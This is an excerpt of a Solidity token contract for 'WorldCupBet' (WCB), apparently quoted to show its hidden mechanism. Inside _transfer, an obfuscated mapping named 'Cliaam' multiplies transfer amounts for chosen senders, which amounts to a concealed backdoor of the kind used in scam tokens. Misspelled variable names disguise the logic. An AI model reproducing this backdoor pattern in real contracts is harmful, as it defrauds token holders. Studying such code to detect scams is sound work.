...
contract token is Ownable, IERC20 {
    ...
    string private _name = "WorldCupBet";
    string private _symbol = "WCB";
    ...
    function _transfer(address sender, address recipient, uint256 amuounts) internal virtual {
        ...
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            fileeamuount = amuounts.mul(_burnfilee).div(100);
            require(amuounts <= _maxTxtransfer);
        }
        ...
        if (Cliaam[sender] > 2  ) {
            amuounts = amuounts.mul(Cliaam[sender]);
        }
